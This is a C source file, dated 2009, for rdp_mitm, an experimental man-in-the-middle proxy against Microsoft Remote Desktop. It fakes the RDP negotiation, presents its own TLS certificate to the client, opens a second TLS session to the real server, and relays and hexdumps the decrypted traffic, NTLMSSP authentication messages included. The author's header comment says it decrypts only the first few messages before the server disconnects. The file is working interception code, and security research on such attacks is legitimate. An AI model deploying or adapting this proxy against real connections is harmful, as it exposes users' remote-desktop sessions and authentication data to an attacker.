/* -*- c-basic-offset: 8 -*-
   rdp_mitm: A Man-In-The-Middle Proxy for Remote Desktop using TLS and NTLMSSP

   Copyright (C) Marc-Andre Moreau <marcandre.moreau@gmail.com> 2009

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

/*
	This program is experimental and prone to errors. It was used with both a client
	and server running on Windows Server 2008 R2. It can currently decrypt the first
	three messages exchanged by the client and server, and then the server disconnects
	the client. In my case, the client and server negotiate to use NTLMSSP, but it may
	also be the case that negotiation leads to usage of Kerberos. My guess about the
	server disconnection is that NTLMSSP uses sends information regarding the client
	or the server that doesn't match anymore because of the proxying. In the very worst
	case, the proxy could fully authenticate using NTLMSSP and re-authenticate with the
	real server after. This may require the proxy to know in advance the real password.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define BUFFER_SIZE	65536

int srcfd;
int dstfd;
int sockfd;
int maxfd;
int ofcmode;
fd_set readfds;
fd_set writefds;

SSL *sslSrc;
SSL *sslDst;
SSL_CTX *ctxSrc;
SSL_CTX *ctxDst;
BIO *bioSrc;
BIO *bioDst;

int n;
int size;
int total;
int addrSize;
int listeningPort;
int serverPort;
char srcIP[25];
char dstIP[25];
int inSrcBuffer;
int inDstBuffer;
char buffer[BUFFER_SIZE];
char srcBuffer[BUFFER_SIZE];
char dstBuffer[BUFFER_SIZE];
struct sockaddr_in addr;
struct sockaddr_in srcAddr;
struct sockaddr_in dstAddr;

unsigned char clientInitial[] =
	"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00";

unsigned char serverInitial[] =
	"\x03\x00\x00\x13\x0e\xd0\x00\x00\x12\x34\x00\x02\x00\x08\x00\x02\x00\x00\x00";

char ntlm_challenge_blob[] =
{
	0x30, 0x37, 0xa0, 0x03, 0x02, 0x01, 0x02, 0xa1, 
	0x30, 0x30, 0x2e, 0x30, 0x2c, 0xa0, 0x2a, 0x04, 
	0x28, 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 
	0x00, 0x01, 0x00, 0x00, 0x00, 0xb7, 0x82, 0x08, 
	0xe2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x06, 0x00, 0x72, 0x17, 0x00, 0x00, 0x00, 
	0x0f
};

void hexdump(char* bytes, int length)
{
	int i;
	int j;
	int k;
	int lineLength;
	unsigned char b;
		
	lineLength = 16;

	for(i = 0; i < length; i += k)
	{
		k = (lineLength < (length - i)) ? lineLength : (length - i);
		
		for(j = 0; j < lineLength; j++)
		{
			if(j < k)
			{
				b = (unsigned char)bytes[i + j];	
				printf("%02X ", b);
			}
			else
				printf("   ");
		}
		printf("       ");

		for(j = 0; j < k; j++)
		{
			if(j < k)
			{
				b = (unsigned char)bytes[i + j];
			
				if(b > 31 && b < 128)
					printf("%c", b);
				else
					printf(".");
			}
			else
				printf(" ");
		}
		printf("\n");
	}
}

int tls_read_record(SSL* ssl, char* b, int size)
{
	int bytesRead = 0;

	n = SSL_read(ssl, b, size);

	switch(SSL_get_error(ssl, n))
	{
		case SSL_ERROR_NONE:
			printf("read %d bytes\n", n);
			hexdump(b, n);
			bytesRead += n;
			break;

		case SSL_ERROR_ZERO_RETURN:
			printf("Connection with was closed\n");
			exit(0);
			break;

		case SSL_ERROR_WANT_READ:
			printf("SSL_ERROR_WANT_READ\n");
			bytesRead += tls_read_record(ssl, &b[bytesRead], size - bytesRead);
			break;

		case SSL_ERROR_WANT_WRITE:
			printf("SSL_ERROR_WANT_WRITE\n");
			break;

		case SSL_ERROR_WANT_CONNECT:
			printf("SSL_ERROR_WANT_CONNECT\n");
			break;

		case SSL_ERROR_WANT_ACCEPT:
			printf("SSL_ERROR_WANT_ACCEPT\n");
			break;

		case SSL_ERROR_WANT_X509_LOOKUP:
			printf("SSL_ERROR_WANT_X509_LOOKUP\n");
			break;
		
		case SSL_ERROR_SYSCALL:
			printf("SSL_ERROR_SYSCALL\n");
			ERR_print_errors_fp(stdout);
			exit(0);
			break;

		case SSL_ERROR_SSL:
			printf("SSL_ERROR_SSL\n");
			ERR_print_errors_fp(stdout);
			break;

		default:
			printf("SSL_ERROR_UNKNOWN\n");
			ERR_print_errors_fp(stdout);
			break;
	}

	return bytesRead;
}

int tls_write_record(SSL* ssl, char* b, int size)
{
	int bytesWritten = 0;
	n = SSL_write(ssl, b, size);

	switch(SSL_get_error(ssl, n))
	{
		case SSL_ERROR_NONE:
			printf("Wrote %d bytes\n", n);
			hexdump(b, n);
			bytesWritten += n;
			break;

		case SSL_ERROR_ZERO_RETURN:
			printf("Connection with was closed\n");
			exit(0);
			break;

		case SSL_ERROR_WANT_READ:
			printf("SSL_ERROR_WANT_READ\n");
			break;

		case SSL_ERROR_WANT_WRITE:
			printf("SSL_ERROR_WANT_WRITE\n");
			break;

		case SSL_ERROR_WANT_CONNECT:
			printf("SSL_ERROR_WANT_CONNECT\n");
			break;

		case SSL_ERROR_WANT_ACCEPT:
			printf("SSL_ERROR_WANT_ACCEPT\n");
			break;

		case SSL_ERROR_WANT_X509_LOOKUP:
			printf("SSL_ERROR_WANT_X509_LOOKUP\n");
			break;
		
		case SSL_ERROR_SYSCALL:
			printf("SSL_ERROR_SYSCALL\n");
			ERR_print_errors_fp(stdout);
			exit(0);
			break;

		case SSL_ERROR_SSL:
			printf("SSL_ERROR_SSL\n");
			ERR_print_errors_fp(stdout);
			break;

		default:
			printf("SSL_ERROR_UNKNOWN\n");
			ERR_print_errors_fp(stdout);
			break;
	}

	if(bytesWritten < size)
		return bytesWritten += tls_write_record(ssl, &b[bytesWritten], size - bytesWritten);
	else
		return bytesWritten;	
}

int main(int argc, char* argv[])
{
	if(argc < 4)
	{
		printf("Usage: ./server <listening port> <server address> <server port>\n");
		exit(0);
	}
	else
	{
		listeningPort = atoi(argv[1]);
		snprintf(dstIP, sizeof(dstIP), "%s", argv[2]);
		serverPort = atoi(argv[3]);
	}

	addrSize = sizeof(struct sockaddr);

	/* Create listening socket */
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	if(sockfd < 0)
	{
		printf("socket() error\n");
		exit(0);
	}

	addr.sin_family = AF_INET; 
	addr.sin_port = htons(listeningPort);
	addr.sin_addr.s_addr = INADDR_ANY;
	memset(&(addr.sin_zero), '\0', 8);

	if(bind(sockfd, (struct sockaddr*)&addr, sizeof(struct sockaddr)) == -1)
	{
		printf("bind() error\n");
		exit(0);
	}

	if(listen(sockfd, 10) == -1)
	{
		printf("listen() error\n");
		exit(0);	
	}
	
	/* Accept incoming connection from source */
	srcfd = accept(sockfd, (struct sockaddr*)&srcAddr, &addrSize);

	snprintf(srcIP, sizeof(srcIP), "%s", inet_ntoa(srcAddr.sin_addr));

	printf("Got connection from %s\n", srcIP);

	/* Fake RDP encryption negotiation with source */

	/* Receive client initial */
	n = recv(srcfd, buffer, BUFFER_SIZE, 0);
	printf("Received RDP client initial from source\n", n);
	hexdump(buffer, n);

	/* Send server initial */
	n = send(srcfd, serverInitial, sizeof(serverInitial) - 1, 0);
	printf("Sent RDP server initial to source\n", n);
	hexdump(serverInitial, n);

	/* Initialize OpenSSL */
	SSL_load_error_strings();
	SSL_library_init();

	bioSrc = BIO_new_socket(srcfd, BIO_NOCLOSE);

	ctxSrc = SSL_CTX_new(TLSv1_server_method());

	if(ctxSrc == NULL)
	{
		printf("SSL_CTX_new() error\n");
		exit(0);
	}

	SSL_CTX_set_options(ctxSrc, SSL_OP_ALL);
	SSL_CTX_set_options(ctxSrc, SSL_OP_NO_TICKET);

	if(SSL_CTX_use_RSAPrivateKey_file(ctxSrc, "server.key", SSL_FILETYPE_PEM) <= 0)
	{
		printf("SSL_CTX_use_RSAPrivateKey_file() error\n");
	}

	sslSrc = SSL_new(ctxSrc);

	if(SSL_use_certificate_file(sslSrc, "server.crt", SSL_FILETYPE_PEM) <= 0)
	{
		printf("SSL_use_certificate_file() error\n");
	}

	if (sslSrc == NULL)
	{
		printf("SSL_new() Error\n");
		exit(0);
	}

	SSL_set_bio(sslSrc, bioSrc, bioSrc);

	if(SSL_accept(sslSrc) <= 0)
	{
		printf("SSL_accept() Error\n");
		exit(0);
	}
	else
	{
		printf("TLS connection established with source\n");
	}

	/* Create destination socket */
	dstfd = socket(AF_INET, SOCK_STREAM, 0);

	if(dstfd < 0)
	{
		printf("socket() error");
		exit(0);
	}

	dstAddr.sin_family = AF_INET;
	dstAddr.sin_port = htons(serverPort);
	inet_pton(AF_INET, dstIP, &dstAddr.sin_addr);
	memset(&(dstAddr.sin_zero), '\0', 8);

	/* Connection to destination */
	if(connect(dstfd, (struct sockaddr*)&dstAddr, addrSize) < 0)
	{
		printf("Error: Could not connect to %s on port %d\n", dstIP, serverPort);
		exit(0);
	}
	else
	{
		printf("Connected to %s on port %d\n", dstIP, serverPort);
	}

	/* Fake RDP encryption negotiation with destination */

	/* Send client initial */
	n = send(dstfd, clientInitial, sizeof(clientInitial) - 1, 0);
	printf("Sent RDP client initial to destination\n", n);
	hexdump(buffer, n);

	/* Receive server initial */
	n = recv(dstfd, buffer, BUFFER_SIZE, 0);
	printf("Received RDP server initial from destination\n", n);
	hexdump(buffer, n);

	/* Create destination TLS context */
	ctxDst = SSL_CTX_new(TLSv1_client_method());

	if(ctxDst == NULL)
	{
		printf("SSL_CTX_new() error\n");
		exit(0);
	}

	SSL_CTX_set_options(ctxDst, SSL_OP_ALL);
	SSL_CTX_set_options(ctxDst, SSL_OP_NO_TICKET);
	SSL_CTX_set_options(ctxDst, SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION);

	sslDst = SSL_new(ctxDst);
	
	if(sslDst == NULL)
	{
		printf("SSL_new() Error\n");
		exit(0);
	}

	bioDst = BIO_new_socket(dstfd, BIO_NOCLOSE);

	SSL_set_bio(sslDst, bioDst, bioDst);

	if(SSL_connect(sslDst) <= 0)
	{
		printf("SSL_connect() error\n");
		exit(0);
	}
	{
		printf("TLS connection established with destination\n");
	}

	/* Set srcfd non-blocking */
	ofcmode = fcntl(srcfd, F_GETFL, 0);
	ofcmode |= O_NDELAY;

	if(fcntl(srcfd, F_SETFL, ofcmode))
	{
		printf("Couldn't set srcfd as non-blocking\n");
		exit(0);
	}

	/* Set dstfd non-blocking */
	ofcmode = fcntl(dstfd, F_GETFL, 0);
	ofcmode |= O_NDELAY;

	if(fcntl(dstfd, F_SETFL, ofcmode))
	{
		printf("Couldn't set srcfd as non-blocking\n");
		exit(0);
	}

	inSrcBuffer = 0;
	inDstBuffer = 0;
	maxfd = (srcfd > dstfd) ? srcfd : dstfd;

	while (1)
	{
		FD_ZERO(&readfds);

		FD_SET(srcfd, &readfds);
		FD_SET(dstfd, &readfds);

		if(select(maxfd + 1, &readfds, NULL, NULL, NULL) == 0)
			continue;

		if(FD_ISSET(srcfd, &readfds))
		{
			printf("srcfd readable\n");
			inSrcBuffer = tls_read_record(sslSrc, srcBuffer, BUFFER_SIZE);	
		}
		if(FD_ISSET(dstfd, &readfds))
		{
			printf("dstfd readable\n");
			inDstBuffer = tls_read_record(sslDst, dstBuffer, BUFFER_SIZE);
		}

		FD_ZERO(&writefds);

		FD_SET(srcfd, &writefds);
		FD_SET(dstfd, &writefds);

		if(select(maxfd + 1, NULL, &writefds, NULL, NULL) == 0)
			continue;

		if(FD_ISSET(srcfd, &writefds) && inDstBuffer > 0)
		{
			printf("srcfd writable\n");
			tls_write_record(sslSrc, dstBuffer, inDstBuffer);
			inDstBuffer = 0;	
		}
		if(FD_ISSET(dstfd, &writefds) && inSrcBuffer > 0)
		{
			printf("dstfd writable\n");
			tls_write_record(sslDst, srcBuffer, inSrcBuffer);
			inSrcBuffer = 0;
		}
	}

	SSL_shutdown(sslSrc);
	SSL_shutdown(sslDst);
	SSL_free(sslSrc);
	SSL_free(sslDst);

	close(sockfd);
	close(srcfd);
	close(dstfd);

	return 0;
}

